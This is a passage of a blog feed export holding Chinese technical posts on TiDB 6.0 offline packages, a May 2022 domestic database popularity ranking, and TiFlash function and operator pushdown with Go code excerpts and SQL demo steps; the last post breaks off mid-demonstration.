                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220511-bbba4ff8-2283-4991-8630-62f391828907.jpg"
                      referrerpolicy="no-referrer"
                >
<p>主要体现在，新增了 <code>binlogctl</code>, <code>etcdctl</code> 和 <code>mydumper</code>。</p>
<p><code>binlogctl</code> 和 <code>etcdctl</code> 是 server 包里 <code>ctl</code> (<code>ctl-v6.0.0-linux-amd64.tar.gz</code>) 组件里的两个可执行文件，这次更新是将这两个文件单独放置到 toolkit 包中，以配合 TiDB Binlog 和 PD Recover 工具一同使用。</p>
<p>同样的，TiDB 适配版的 <code>mydumper</code> 放到 toolkit 包中，是为了配合 TiDB Lighting 进行数据备份。</p>
<h2 id="总结">总结</h2>
<p>TiDB v6.0 离线包的调整，是 TiDB 可管理性增强的具体体现。对于工具组件包的存储、使用也更加便利、直观。这也是私有云数据库的诉求之一。私有云数据库在云数据库时代占有举足轻重的地位，完备的离线安装包可以助力我们快速、高效地在内网环境下搭建数据库集群。相信 TiDB 在后续的版本中会持续加强离线包，并带来更加稳定、强劲的企业级 HTAP 数据库。</p>
<h2 id="参考资料">参考资料</h2>
<ul>
<li><a class="link"   href="https://pingcap.com/zh/product-community/" >TiDB 社区版软件包 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://docs.pingcap.com/zh/tidb/dev/clinic-introduction" >PingCAP Clinic 诊断服务简介 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a href="https://shawnyan.cn/2022/tidb/tiup-intro/">TiUP: TiDBAer 必备利器</a></li>
<li><a href="https://shawnyan.cn/2022/tidb/mydumper-and-dumpling/">mydumper &amp; dumpling 知识点汇总</a></li>
</ul>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/401830" >https://www.modb.pro/db/401830 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://tidb.net/blog/3a05d13c?shareId=fdf35157" >https://tidb.net/blog/3a05d13c?shareId=fdf35157 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://tidb.net/book/book-rush/manageability/other-features/offline-package" >https://tidb.net/book/book-rush/manageability/other-features/offline-package <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>TiDB</category>
        <category>TiDB 6.x</category>
      </categories>
      <tags>
        <tag>tidb</tag>
        <tag>tidb 6.x</tag>
        <tag>pingcap</tag>
        <tag>asktug</tag>
        <tag>package</tag>
      </tags>
  </entry>
  <entry>
    <title>2022年5月中国数据库排行榜：openGauss 黑马首登顶，AntDB 冲进20强</title>
    <url>/2022/modb/modb-2022-05-db-ranking/</url>
    <content><![CDATA[<blockquote>
<p>四月清和雨乍晴，南山当户转分明。<br>
—— 司马光《客中初夏》</p>
</blockquote>
<p>立夏时节刚过，春已去，夏将至，“小荷才露尖尖角”。<br>
最新一期 <a class="link"   href="https://www.modb.pro/dbRank" >国产数据库流行度排行榜 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 已于五一发布，接下来请您与我一起来看看5月份国产数据库排行榜都发生了哪些变化。</p>
<img  alt="1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220509-b5cfd6a8-ffc7-47ea-84c6-b738fdd7cf54.png"
                      referrerpolicy="no-referrer"
                >
图1-openGauss增长趋势图
<img  alt="2.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220509-ad56ad5a-574b-4212-a449-41524263e2e2.jpg"
                      referrerpolicy="no-referrer"
                >
图2-排行榜20强
<h2 id="“三强”鼎立之势已成">“三强”鼎立之势已成</h2>
<h3 id="openGauss：荣登榜首">openGauss：荣登榜首</h3>
<p>openGauss 自20年10月上榜以来，一路高歌猛进，只用了19个月的时间就问鼎中国数据库排行榜。恭喜 openGauss。</p>
<p>4月1日，openGauss 3.0.0 版本正式发布！该版本是 openGauss 社区继2.0.0之后发布的又一个Release版本，版本维护生命周期为3.5年。3.0.0版本在高性能、高可用、高安全、高智能、工具链等方面都有持续创新和突破。本版本除了包含企业版以外，还同时发布了 openGauss 社区首个轻量版（Lite版）。云和恩墨紧密跟踪 openGauss 的源码变化，第一时间发布了新版本的容器镜像。</p>
<p>openGauss 官网地址：<a class="link"   href="https://opengauss.org/zh/" >https://opengauss.org/zh/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
openGauss 容器镜像地址：<a class="link"   href="https://hub.docker.com/r/enmotech/opengauss" >https://hub.docker.com/r/enmotech/opengauss <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>openGauss 3.0.0 创新突破：</p>
<blockquote>
<p>鲲鹏单机性能持续保持领先，TPCC达到100万tpmC<br>
实现企业级集群管理能力，支持自定义资源监控<br>
全密态数据库能力持续增强，支持JDBC开发接口<br>
自治运维平台DBMind系统组件化，调用AI自治功能<br>
支持使用中间件ShardingSphere构建分布式数据库</p>
</blockquote>
<p>4月13~4月15日，openEuler Developer Day 大会举行。大会第二天，openGauss 正式发布了“社区贡献排行榜”，云和恩墨位列伙伴贡献第一名。</p>
<img  alt="3.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220509-fdcf1edd-1355-4643-8939-8b73a7763cf1.png"
                      referrerpolicy="no-referrer"
                >
图3-openGauss单位会员贡献排行榜
<p>4月23日，采用了 openGauss 开源数据库与GaussDB分布式云数据库的中国邮政储蓄银行新一代个人业务分布式核心系统全面投产上线。系统上线后可支撑海量交易、弹性伸缩、金融核心级高可靠和高可用，可具备为全行6.37亿个人客户、4万个网点提供日均20亿笔，峰值6.7万笔/秒的交易处理能力。</p>
<p>同一天，由 openGauss 社区主办，重庆鲲鹏创新中心、云和恩墨承办的 <a class="link"   href="https://www.modb.pro/db/397993" >openGauss Meetup 活动 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 在重庆西永微电产业园成功举办。</p>
<p>毋庸置疑，openGauss 在社区生态的发展上投入很多，尤其是得到了很多高校的教授和学生们的支持，这对于国内数据库人才的发展培养是有着深远的正向激励的。</p>
<h3 id="TiDB：或将继续徘徊在-600-分高位">TiDB：或将继续徘徊在 600 分高位</h3>
<p>4月1日“愚人节”，TiFlash 正式宣布开源，TiFlash 在历经两个大版本的打磨后，终于加入 TiDB 开源大家庭。</p>
<p>TiFlash 开源地址：<a class="link"   href="https://github.com/pingcap/tiflash" >https://github.com/pingcap/tiflash <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
TiFlash 官方文档：<a class="link"   href="https://docs.pingcap.com/zh/tidb/stable/tiflash-overview" >TiFlash 简介 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>并在一周后，4月7日，TiDB 6.0 发版，本次发版不仅引入了诸多新特性，还引入了新的发版模型，即长期支持版本（Long-Term）与开发里程碑版本（DMR）并行发版。</p>
<blockquote>
<p>TiDB 6.0 引入数据放置框架（Placement Rules In SQL），增加了企业级集群管理组件 TiDB Enterprise Manager ，开放了智能诊断服务 PingCAP Clinic 的预览，大幅加强了生态工具的可运维性，并针对热点问题为用户提供了更多的手段。</p>
</blockquote>
<blockquote>
<p>长期支持版本 (Long-Term Support Releases)<br>
长期支持版本约每六个月发布一次，会引入新的功能和改进，并会按需在版本生命周期内发布 Bug 修订版本。例如：v6.1.0。<br>
开发里程碑版 (Development Milestone Releases, DMR)<br>
DMR 版本约每两个月发布一次，会引入新的功能和改进。TiDB 不提供基于 DMR 的 Bug 修订版本，不推荐在生产环境使用。例如：v6.0.0-DMR。</p>
</blockquote>
<p>在生态建设方面，新一期 <a class="link"   href="https://asktug.com/t/topic/663542" >Talent 分布式事务短训营 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 活动已结束，相信参加活动的高校学生们一定收获满满，对国产数据库的开发也有了初步了解。</p>
<p>再者，从排行榜的趋势图来看，TiDB 已经稳定在 600 分高位一年之久，数据库作为信息系统的基石，稳定大于一切，相信这种稳定趋势是 TiDB 在不断做自我调整，沉积力量。</p>
<img  alt="4.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220509-501f078a-8e87-467f-9b4c-18992b153708.jpg"
                      referrerpolicy="no-referrer"
                >
图4-近一年 TiDB 代码变更行数
<h3 id="OceanBase：调整过后持续走高">OceanBase：调整过后持续走高</h3>
<p>OceanBase 经历几个月的调整后再次发力，排行榜上 Top 3 的分数已相当接近。</p>
<img  alt="5.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220509-316750d4-1a3c-4e69-be90-5c6e0c41048c.jpg"
                      referrerpolicy="no-referrer"
                >
图5-OceanBase本月得分
<p>4月18日，OceanBase 企业版 3.2.3 正式发版，该版本是3.x 系列的第一个LTS（Long Term Support 长期支持）版本，也是HTAP能力的里程碑版本。<br>
前三强有两家数据库厂商近期都在 HTAP 上发力，而 openGauss 本身也是自带 HTAP 属性，预期今年下半年头部厂商及其他数据库厂商都会在 HTAP 方面做持续增强。</p>
<p>4月份 OceanBase 在厂商活动方面完成两项大赛，分别是 <a class="link"   href="https://www.modb.pro/db/215662" >OceanBase Hackathon 决赛 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 和 <a class="link"   href="https://www.modb.pro/db/388053" >第三届技术征文大赛 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。<br>
并举办两期《对话ACE》活动，<a class="link"   href="https://www.modb.pro/event/569/3351" >对话ACE第一期：Oracle停服俄罗斯，国产数据库未来发展 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 和 <a class="link"   href="https://open.oceanbase.com/activities/1921899" >新数据库时代：DBA发展之路该如何选择 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>此外，OceanBase 社区版的四月月报分享会也如期召开，具体会议纪要可参考 <a class="link"   href="https://github.com/oceanbase/oceanbase/discussions/871" >OceanBase Community Monthly Report 2022/4 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。</p>
<h2 id="百花依旧在，“墨”卷更有益">百花依旧在，“墨”卷更有益</h2>
<h3 id="“四朵金花”依旧绽放">“四朵金花”依旧绽放</h3>
<p>4月12日消息，日前，安超云与人大金仓完成产品兼容性互认证。安超云操作系统与人大金仓的金仓数据库管理系统 KingbaseES V8 相互兼容，系统功能运行稳定，满足用户更多的上云需求。<br>
16日，人大金仓公布 <a class="link"   href="https://www.modb.pro/db/395007" >2021年营收3.41亿，利润3000万，同比增四倍 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p>4月16日，神舟十三号载人飞船返回舱安全着陆。神通团队圆满完成神舟十三号重点保障任务。在整个返回任务中，神通数据库产品应用于多个关键部位，有效保障飞控数据高效存储处理，为飞控中心实时提供精准数据，护航返回舱平安落地。</p>
<p>4月24日，南大通用联合墨天轮社区共同举办的 <a class="link"   href="https://www.modb.pro/db/397822" >第一届“GBASE技术文章”有奖征文活动圆满收官 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p>4月21日消息，达梦数据库<a class="link"   href="https://www.modb.pro/db/397208" >市场份额增速行业领先，盈利能力大幅提升 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p>作为国产数据库的先驱者，“四朵金花”依旧艳丽，并且为我国的各项事业建设默默付出着。</p>
<img  alt="6.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220509-a22cf3d2-8445-4132-a5ef-3af4fcd095f0.png"
                      referrerpolicy="no-referrer"
                >
图6-欢迎回家
<h3 id="国产“新势力”激流勇进">国产“新势力”激流勇进</h3>
<p>5月排行榜新上榜数据库 28 个，具体参见下表（按数据库模型分类）。</p>
<table>
<thead>
<tr>
<th>模型</th>
<th>新增数</th>
<th>数据库名称</th>
</tr>
</thead>
<tbody>
<tr>
<td>向量</td>
<td>3</td>
<td>Om-iBASE, TensorDB, Vearch</td>
</tr>
<tr>
<td>列簇</td>
<td>1</td>
<td>Hyperbase</td>
</tr>
<tr>
<td>搜索</td>
<td>1</td>
<td>Scope</td>
</tr>
<tr>
<td>空间</td>
<td>2</td>
<td>Spacture, iBEST-DB</td>
</tr>
<tr>
<td>时序</td>
<td>1</td>
<td>TimeLyre</td>
</tr>
<tr>
<td>关系型</td>
<td>19</td>
<td>EventStore, Slipstream, Inceptor, AtomData, AtomStore, SeaboxSQL, SeaboxMPP, πDB, VeDB, ByteHouse, ecDATA, QcubicSharding, QFlow, DragonDB, HGDW, IvorySQL, NSDB, 东软思来得, SelectDB</td>
</tr>
<tr>
<td>键值</td>
<td>1</td>
<td>KeyByte</td>
</tr>
</tbody>
</table>
<p>其中，新增的关系型数据库中，支持 MPP 架构的有5个产品，分别为：SeaboxMPP, πDB, ByteHouse, HGDW, 东软思来得。</p>
<p>此外，需要说明的是，<a class="link"   href="https://www.modb.pro/wiki/2317" >空间数据库 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 、<a class="link"   href="https://www.modb.pro/wiki/2411" >向量数据库 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 、<a class="link"   href="https://www.modb.pro/wiki/2415" >搜索数据库 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 是本月新增的数据库模型。</p>
<h2 id="凡是过往，皆为序章">凡是过往，皆为序章</h2>
<p>四月份，墨天轮编辑部再发表《假如你身处被“科技制裁”的俄罗斯》系列访谈文章三篇。</p>
<ul>
<li><a class="link"   href="https://www.modb.pro/db/386738" >《假如你身处被“科技制裁”的俄罗斯》之从业者篇 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://www.modb.pro/db/389160" >《假如你身处被“科技制裁”的俄罗斯》之人大金仓篇 ——总裁杜胜 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://www.modb.pro/db/391107" >《假如你身处被“科技制裁”的俄罗斯》之GBase篇 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<p>过去的辉煌不代表未来的路途顺畅，这个系列的文章足以给每位数据库从业者敲响警钟，要时刻保持清晰的头脑，心怀敬畏。</p>
<p>努力发展国产数据库，提早预防、处理“卡脖子”问题是每一位数据库从业者的责任所在。</p>
<h2 id="彩蛋">彩蛋</h2>
<ul>
<li><a class="link"   href="https://www.modb.pro/event/589/3351" >8小时玩转openGauss训练营（第三期） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 开营在即，欢迎预约直播。</li>
<li><a class="link"   href="https://www.modb.pro/db/390481" >星环科技 “星环杯” 全球征文大赛 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 持续进行中，欢迎投稿。</li>
</ul>
<h2 id="相关链接">相关链接</h2>
<ul>
<li><a class="link"   href="https://www.modb.pro/dbRank" >国产数据库排行榜 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://www.modb.pro/db/399318" >2022年4月国产数据库大事记 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://www.modb.pro/db/399664" >2022年5月中国数据库排行榜：openGauss 首登榜首，前九三商三云三开源 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<p>ShawnYan<br>
2022-05-09</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/400877" >https://www.modb.pro/db/400877 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://mp.weixin.qq.com/s?__biz=MzU0NTk1MTc2Ng==&amp;mid=2247487073&amp;idx=2&amp;sn=43c333577d94fbad34356912e29f2956" >2022-05-16, 5月榜单解读：openGauss 黑马首登顶，AntDB 冲进20强 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>墨天轮</category>
      </categories>
      <tags>
        <tag>oceanbase</tag>
        <tag>opengauss</tag>
        <tag>墨天轮</tag>
        <tag>国产数据库排行榜</tag>
        <tag>国产数据库</tag>
        <tag>tidb</tag>
        <tag>antdb</tag>
      </tags>
  </entry>
  <entry>
    <title>TiDB 6.x 新特性解读 | TiFlash 新增算子和函数下推</title>
    <url>/2022/tidb/tidb-6.0-tiflash-pushing-down/</url>
    <content><![CDATA[<p>TiDB 6.0 对 TiFlash 的功能做了进一步增强，其中新增支持了 12 个函数和 2 个算子下推到 TiFlash 层的 MPP 引擎进行计算。<br>
本文将对其逐一进行演示，以期快速、直观的展示这些新特性。</p>
<img  alt="IMG_2005.JPG" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/IMG_2005-1652257515326.jpg"
                      referrerpolicy="no-referrer"
                >
<h2 id="TiFlash-和-MPP-引擎">TiFlash 和 MPP 引擎</h2>
<p>先来简要回顾一下相关概念。</p>
<ul>
<li>TiFlash 是 TiDB HTAP 形态的关键组件，它是 TiKV 的列存扩展。</li>
<li>TiFlash 于2022年4月1日正式开源，主要功能包括列式存储提高分析查询效率，支持强一致性和实时性等，并提供了良好的隔离性。</li>
<li>TiFlash 的引入，为 MPP 架构提供了技术基础，MPP 架构解决了多表 JOIN 场景下的计算节点的扩展性与并行计算的问题。</li>
<li>TiFlash 通过在存储层分担计算下推，从而实现对 TiDB 的计算加速。</li>
</ul>
<h2 id="新增支持下推函数汇总">新增支持下推函数汇总</h2>
<p>从 TiDB 6.0 的 <a class="link"   href="https://docs.pingcap.com/zh/tidb/v6.0/release-6.0.0-dmr#%E6%8F%90%E5%8D%87%E6%94%B9%E8%BF%9B" >发版说明 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
中可以清晰的看到，这次大版本迭代给 TiFlash 支持计算下推带来了进一步扩展，共计新增支持了 12 个函数，以及 2 个算子，原文如下。</p>
<blockquote>
<p>支持下推 DAYNAME()和 MONTHNAME() 函数到 TiFlash #32594<br>
支持下推 REGEXP 函数到 TiFlash #32637<br>
支持下推 DAYOFMONTH()，LAST_DAY() 函数到 TiFlash #33012<br>
支持下推 DAYOFWEEK() 和 DAYOFYEAR() 函数到 TiFlash #33130<br>
支持下推 IS_TRUE、IS_FALSE、IS_TRUE_WITH_NULL 函数到 TiFlash #33047<br>
支持下推 GREATEST 和 LEAST 函数到 TiFlash #32787<br>
算子：Anti Left Outer Semi Join, Left Outer Semi Join</p>
</blockquote>
<p>从文档中提供的线索，我们可以反向推演，经寻找代码变更，汇总可知，主要对文件 <code>expression.go</code> 进行了修改，主要修改的代码如下。<br>
已对代码进行了标注，增加了行数和相关 RP 号，以供参考。</p>
<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// L1051</span></span><br><span class="line"><span class="keyword">case</span></span><br><span class="line">   ast.LogicOr, ast.LogicAnd, ast.UnaryNot, ast.BitNeg, ast.Xor, ast.And, ast.Or,</span><br><span class="line">   ast.GE, ast.LE, ast.EQ, ast.NE, ast.LT, ast.GT, ast.In, ast.IsNull, ast.Like, ast.Strcmp,</span><br><span class="line">   ast.Plus, ast.Minus, ast.Div, ast.Mul, ast.Abs, ast.Mod,</span><br><span class="line">   ast.If, ast.Ifnull, ast.Case,</span><br><span class="line">   ast.Concat, ast.ConcatWS,</span><br><span class="line">   ast.Date, ast.Year, ast.Month, ast.Day, ast.Quarter, ast.DayName, ast.MonthName, -- #<span class="number">32594</span></span><br><span class="line">   ast.DateDiff, ast.TimestampDiff, ast.DateFormat, ast.FromUnixTime,</span><br><span class="line">   ast.DayOfMonth, ast.LastDay, -- #<span class="number">33012</span></span><br><span class="line">   ast.DayOfWeek, ast.DayOfYear, -- #<span class="number">33130</span></span><br><span class="line"></span><br><span class="line">   ast.Sqrt, ast.Log, ast.Log2, ast.Log10, ast.Ln, ast.Exp, ast.Pow, ast.Sign,</span><br><span class="line">   ast.Radians, ast.Degrees, ast.Conv, ast.CRC32,</span><br><span class="line">   ast.JSONLength,</span><br><span class="line">   ast.InetNtoa, ast.InetAton, ast.Inet6Ntoa, ast.Inet6Aton,</span><br><span class="line">   ast.Coalesce, ast.ASCII, ast.Length, ast.Trim, ast.Position, ast.Format,</span><br><span class="line">   ast.LTrim, ast.RTrim, ast.Lpad, ast.Rpad, ast.Regexp, -- #<span class="number">32637</span></span><br><span class="line">   ast.Hour, ast.Minute, ast.Second, ast.MicroSecond:</span><br><span class="line"></span><br><span class="line"><span class="comment">// L1155</span></span><br><span class="line"><span class="keyword">case</span> ast.Least, ast.Greatest: -- #<span class="number">32787</span></span><br><span class="line">   <span class="keyword">switch</span> function.Function.PbCode() &#123;</span><br><span class="line">   <span class="keyword">case</span> tipb.ScalarFuncSig_GreatestInt, tipb.ScalarFuncSig_GreatestReal,</span><br><span class="line">      tipb.ScalarFuncSig_LeastInt, tipb.ScalarFuncSig_LeastReal:</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// L1161</span></span><br><span class="line"><span class="keyword">case</span> ast.IsTruthWithNull, ast.IsTruthWithoutNull, ast.IsFalsity: -- #<span class="number">33047</span></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>将 TiFlash 6.0 新增算子对应的函数名、SQL的函数名，按函数类型归类，总结成下表，更便于查询和分析。</p>
<table>
<thead>
<tr>
<th>Issue</th>
<th>代码中的函数名</th>
<th>SQL中的函数名</th>
<th>函数类型</th>
<th>功能描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><a class="link"   href="https://github.com/pingcap/tidb/issues/32594" >#32594 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>ast.DayName, ast.MonthName</td>
<td>DAYNAME(), MONTHNAME()</td>
<td>日期函数</td>
<td>返回星期名称；返回参数的月份名称</td>
</tr>
<tr>
<td><a class="link"   href="https://github.com/pingcap/tidb/issues/33012" >#33012 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>ast.DayOfMonth, ast.LastDay</td>
<td>DAYOFMONTH(), LAST_DAY()</td>
<td>日期函数</td>
<td>返回参数对应的天数部分(1-31)；返回参数中月份的最后一天</td>
</tr>
<tr>
<td><a class="link"   href="https://github.com/pingcap/tidb/issues/33130" >#33130 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>ast.DayOfWeek, ast.DayOfYear</td>
<td>DAYOFWEEK(), DAYOFYEAR()</td>
<td>日期函数</td>
<td>返回参数对应的星期下标；返回参数代表一年的哪一天 (1-366)</td>
</tr>
<tr>
<td><a class="link"   href="https://github.com/pingcap/tidb/issues/32637" >#32637 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>ast.Regexp</td>
<td>REGEXP</td>
<td>字符串函数</td>
<td>使用正则表达式匹配模式</td>
</tr>
<tr>
<td><a class="link"   href="https://github.com/pingcap/tidb/issues/32787" >#32787 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>ast.Least, ast.Greatest</td>
<td>LEAST(), GREATEST()</td>
<td>操作符</td>
<td>返回最小值；返回最大值</td>
</tr>
<tr>
<td><a class="link"   href="https://github.com/pingcap/tidb/issues/33047" >#33047 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></td>
<td>ast.IsTruthWithNull, ast.IsTruthWithoutNull, ast.IsFalsity</td>
<td>istrue_with_null, istrue, isfalse</td>
<td>操作符</td>
<td>判断是否为真，如果结果为null，则返回null；判断是否为真，如果结果为null，则返回0；判断是否为假</td>
</tr>
</tbody>
</table>
<h2 id="新增支持算子下推汇总">新增支持算子下推汇总</h2>
<p>本次版本迭代新增支持了两个算子可以下推至 MPP 引擎，分别是 <code>Left Outer Semi Join</code> 和 <code>Anti Left Outer Semi Join</code>。</p>
<p>中文表述为左外半连接（<code>Left Outer Semi Join</code>）和反左外半连接（<code>Anti Left Outer Semi Join</code>），半连接意为仅需要匹配第一行后就可以停止查询，而“反”则表示有不存在匹配值（即 <code>NOT IN</code>）的情况。<br>
查阅历史发版说明可知，在 TiDB 3.0 发版时，针对 <code>NOT EXISTS</code> 子查询进行优化，将其转化为 <code>Anti Semi Join</code> <a class="link"   href="https://github.com/pingcap/tidb/pull/7842" >#7842 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 。而在 TiFlash 中的这两种 Join 都是基于 Hash Join 实现，对于大、宽表关联查询的场景，会比使用索引关联的效率更高。</p>
<h2 id="新特性演示">新特性演示</h2>
<ul>
<li>TiDB 版本</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">TiDB<span class="operator">-</span>v6<span class="operator">&gt;</span> <span class="keyword">select</span> tidb_version()\G</span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">tidb_version(): <span class="keyword">Release</span> Version: v6<span class="number">.0</span><span class="number">.0</span></span><br><span class="line">Edition: Community</span><br><span class="line">Git <span class="keyword">Commit</span> Hash: <span class="number">36</span>a9810441ca0e496cbd22064af274b3be771081</span><br><span class="line">Git Branch: heads<span class="operator">/</span>refs<span class="operator">/</span>tags<span class="operator">/</span>v6<span class="number">.0</span><span class="number">.0</span></span><br><span class="line">UTC Build <span class="type">Time</span>: <span class="number">2022</span><span class="number">-03</span><span class="number">-31</span> <span class="number">10</span>:<span class="number">33</span>:<span class="number">28</span></span><br><span class="line">GoVersion: go1<span class="number">.18</span></span><br><span class="line">Race Enabled: <span class="literal">false</span></span><br><span class="line">TiKV Min Version: v3<span class="number">.0</span><span class="number">.0</span><span class="number">-60965</span>b006877ca7234adaced7890d7b029ed1306</span><br><span class="line"><span class="keyword">Check</span> <span class="keyword">Table</span> Before <span class="keyword">Drop</span>: <span class="literal">false</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure></div>
<ul>
<li>准备测试表、数据</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">USE test;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> t;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> t (id <span class="type">int</span>, dc datetime, cc1 <span class="type">char</span>(<span class="number">20</span>), cc2 <span class="type">char</span>(<span class="number">20</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> t <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;2022-04-30 15:33:10&#x27;</span>, <span class="string">&#x27;UUtJeaV&#x27;</span>, <span class="string">&#x27;snRXXCZHBPW&#x27;</span>), (<span class="number">2</span>, <span class="string">&#x27;2022-05-01 15:33:20&#x27;</span>, <span class="string">&#x27;snRXXCZHBPW&#x27;</span>, <span class="string">&#x27;UUtJeaV&#x27;</span>);</span><br><span class="line">ANALYZE <span class="keyword">TABLE</span> t;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>创建 TiFlash 数据副本，并强制开启 MPP 模式</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> t <span class="keyword">SET</span> TIFLASH REPLICA <span class="number">1</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.tiflash_replica;</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> TiDB 无视代价估算，选择 MPP 模式。</span><br><span class="line"><span class="keyword">set</span> @<span class="variable">@session</span>.tidb_allow_mpp<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">set</span> @<span class="variable">@session</span>.tidb_enforce_mpp<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>日期函数</li>
</ul>
<p>由上表可知本次迭代共涉及 6 个日期函数，下面将用 SQL 来做演示，从执行计划中可以看到已经支持函数下推到 TiFlash。后面演示过程以此类推。</p>
